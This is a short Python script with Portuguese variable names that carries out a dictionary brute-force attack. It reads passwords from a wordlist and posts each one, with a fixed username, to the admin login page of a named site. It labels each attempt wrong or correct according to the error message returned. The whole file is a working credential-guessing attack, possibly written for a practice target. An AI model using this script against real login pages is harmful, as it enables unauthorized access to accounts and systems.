import requests

url = 'http://www.bancocn.com/admin/login.php'

arquivo = open('dicionario.txt')
linhas = arquivo.readlines()

for linha in linhas:
    dados = {'username': 'example@example.com',
             'password': linha}

    resposta = requests.post(url, data=dados)

    if "senha errados" in resposta.text:
        print "Senha incorreta:", linha
    else:
        print "Senha correta:", linha
